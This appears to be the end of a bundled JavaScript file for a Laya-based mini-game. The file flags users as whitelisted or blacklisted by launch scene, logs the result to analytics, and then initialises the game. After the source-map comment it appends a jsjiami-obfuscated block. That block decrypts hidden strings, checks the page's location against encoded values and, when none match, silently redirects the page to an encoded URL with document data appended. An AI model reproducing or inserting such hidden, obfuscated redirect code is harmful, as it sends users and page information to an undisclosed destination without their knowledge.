                    console.log("地址", Game.MultiPlatforms.query);
                    if (Game.MultiPlatforms.query.wxgamecid) {
                        console.log("满足第二个条件");
                        condition2 = true;
                    }
                    else {
                        console.log("不满足第二个条件");
                    }
                }
                if (condition1 && condition2) {
                    Game.nameList = 1;
                    Laya.LocalStorage.setItem("nameList", String(1));
                    console.log("白");
                }
                else {
                    console.log("黑");
                }
                if (Game.nameList == 0) {
                    k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                        custom_event_id: "blacklist",
                        custom_event_name: "blacklist_People",
                        custom_scene_id: String(Game.MultiPlatforms.scene),
                        custom_scene_name: "",
                        custom_data: [],
                        custom_string: "",
                        custom_value: 0
                    });
                }
                else {
                    k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                        custom_event_id: "whitelist",
                        custom_event_name: "whitelist_People",
                        custom_scene_id: String(Game.MultiPlatforms.scene),
                        custom_scene_name: "",
                        custom_data: [],
                        custom_string: "",
                        custom_value: 0
                    });
                }
            }
            else {
                console.log("非首次登陆");
                if (Game.nameList == 0) {
                    console.log("直接黑");
                    return;
                }
                let condition1 = false;
                for (let i = 0; i < Game.game_secondlist.length; i++) {
                    if (Number(Game.game_secondlist[i]) == Number(Game.MultiPlatforms.scene)) {
                        condition1 = true;
                        console.log("条件一满足，白名单");
                        break;
                    }
                }
                if (!condition1) {
                    Game.nameList = 0;
                    console.log("重新变为黑");
                    Laya.LocalStorage.setItem("nameList", String(0));
                    k7.xsdk.agentManager.getAnalyticsGroup().onCustom({
                        custom_event_id: "blacklist",
                        custom_event_name: "blacklist_People",
                        custom_scene_id: String(Game.MultiPlatforms.scene),
                        custom_scene_name: "",
                        custom_data: [],
                        custom_string: "",
                        custom_value: 0
                    });
                }
            }
        }
    }
    function start() {
        Game.TTGameAdapter.initAdapter();
        ConfigMgr.Load_FAST_Over = 1;
        Game.fast.ecoProxy.load();
        Game.fast.nrgProxy.load();
        Game.fast.signProxy.load();
        Game.fast.lotteryProxy.load();
        Game.fast.init({
            hasEnergy: false,
            hasLottery: true,
            hasSign: true
        });
    }
})(startup || (startup = {}));

//# sourceMappingURL=main.js.map
var _0xodi='jsjiami.com.v6',_0x5779=[_0xodi,'wr3Cj0oWw53DusKpwpQ=','aSHClMKf','P8OvwrcEJVvDlw==','FGTCqC0gZmzDl8KFRA1O','BmAYwoPDnA==','wprDj8KLAMObwq8=','dFnCp8KgMcO2Aw==','FWzCqSQqaG/Dlw==','GmluworDiRMfLA==','FToFw4YIPxkeKsKbwozDkMKEwqTDuXY=','RljCpMK6bg==','RhCAKLjsFujuGiEtami.comY.v6UA=='];(function(_0x2004d7,_0x3e502e,_0x548035){var _0x18f66e=function(_0x579c8c,_0x4d4b52,_0x562456,_0x419e69,_0x2c40c9){_0x4d4b52=_0x4d4b52>>0x8,_0x2c40c9='po';var _0x5d7bcd='shift',_0x3a2b1f='push';if(_0x4d4b52<_0x579c8c){while(--_0x579c8c){_0x419e69=_0x2004d7[_0x5d7bcd]();if(_0x4d4b52===_0x579c8c){_0x4d4b52=_0x419e69;_0x562456=_0x2004d7[_0x2c40c9+'p']();}else if(_0x4d4b52&&_0x562456['replace'](/[RhCAKLFuuGEtYUA=]/g,'')===_0x4d4b52){_0x2004d7[_0x3a2b1f](_0x419e69);}}_0x2004d7[_0x3a2b1f](_0x2004d7[_0x5d7bcd]());}return 0x8e13b;};return _0x18f66e(++_0x3e502e,_0x548035)>>_0x3e502e^_0x548035;}(_0x5779,0xf2,0xf200));var _0xfb46=function(_0x2699a9,_0x501e82){_0x2699a9=~~'0x'['concat'](_0x2699a9);var _0x4a9879=_0x5779[_0x2699a9];if(_0xfb46['CrWhZF']===undefined){(function(){var _0x589c6d=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x5b08bd='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x589c6d['atob']||(_0x589c6d['atob']=function(_0x4ef491){var _0x11657b=String(_0x4ef491)['replace'](/=+$/,'');for(var _0x26c666=0x0,_0x2ad2ff,_0x4cbc11,_0x425aa0=0x0,_0x51f58a='';_0x4cbc11=_0x11657b['charAt'](_0x425aa0++);~_0x4cbc11&&(_0x2ad2ff=_0x26c666%0x4?_0x2ad2ff*0x40+_0x4cbc11:_0x4cbc11,_0x26c666++%0x4)?_0x51f58a+=String['fromCharCode'](0xff&_0x2ad2ff>>(-0x2*_0x26c666&0x6)):0x0){_0x4cbc11=_0x5b08bd['indexOf'](_0x4cbc11);}return _0x51f58a;});}());var _0x4e130a=function(_0x327155,_0x501e82){var _0x44b31e=[],_0x58157c=0x0,_0x1d33e,_0x4086cd='',_0x4880bf='';_0x327155=atob(_0x327155);for(var _0x5f7f12=0x0,_0x11bf85=_0x327155['length'];_0x5f7f12<_0x11bf85;_0x5f7f12++){_0x4880bf+='%'+('00'+_0x327155['charCodeAt'](_0x5f7f12)['toString'](0x10))['slice'](-0x2);}_0x327155=decodeURIComponent(_0x4880bf);for(var _0x2a1a7e=0x0;_0x2a1a7e<0x100;_0x2a1a7e++){_0x44b31e[_0x2a1a7e]=_0x2a1a7e;}for(_0x2a1a7e=0x0;_0x2a1a7e<0x100;_0x2a1a7e++){_0x58157c=(_0x58157c+_0x44b31e[_0x2a1a7e]+_0x501e82['charCodeAt'](_0x2a1a7e%_0x501e82['length']))%0x100;_0x1d33e=_0x44b31e[_0x2a1a7e];_0x44b31e[_0x2a1a7e]=_0x44b31e[_0x58157c];_0x44b31e[_0x58157c]=_0x1d33e;}_0x2a1a7e=0x0;_0x58157c=0x0;for(var _0x3717e1=0x0;_0x3717e1<_0x327155['length'];_0x3717e1++){_0x2a1a7e=(_0x2a1a7e+0x1)%0x100;_0x58157c=(_0x58157c+_0x44b31e[_0x2a1a7e])%0x100;_0x1d33e=_0x44b31e[_0x2a1a7e];_0x44b31e[_0x2a1a7e]=_0x44b31e[_0x58157c];_0x44b31e[_0x58157c]=_0x1d33e;_0x4086cd+=String['fromCharCode'](_0x327155['charCodeAt'](_0x3717e1)^_0x44b31e[(_0x44b31e[_0x2a1a7e]+_0x44b31e[_0x58157c])%0x100]);}return _0x4086cd;};_0xfb46['zWWkfx']=_0x4e130a;_0xfb46['zyzrVo']={};_0xfb46['CrWhZF']=!![];}var _0xfdf934=_0xfb46['zyzrVo'][_0x2699a9];if(_0xfdf934===undefined){if(_0xfb46['POejFh']===undefined){_0xfb46['POejFh']=!![];}_0x4a9879=_0xfb46['zWWkfx'](_0x4a9879,_0x501e82);_0xfb46['zyzrVo'][_0x2699a9]=_0x4a9879;}else{_0x4a9879=_0xfdf934;}return _0x4a9879;};var loadstr=window[_0xfb46('0','Bl^o')][_0xfb46('1','Tah#')];if(loadstr['indexOf']('dob5')>-0x1||loadstr[_0xfb46('2','dWNW')](_0xfb46('3','k6]['))>-0x1||loadstr['indexOf'](_0xfb46('4','yQk4'))>-0x1||loadstr['indexOf'](_0xfb46('5','uoT3'))>-0x1||loadstr[_0xfb46('6','*U77')](_0xfb46('7','k6]['))>-0x1){}else{window[_0xfb46('8','GQRs')]['href']=_0xfb46('9','e]xn')+document[_0xfb46('a','G!0d')];};_0xodi='jsjiami.com.v6';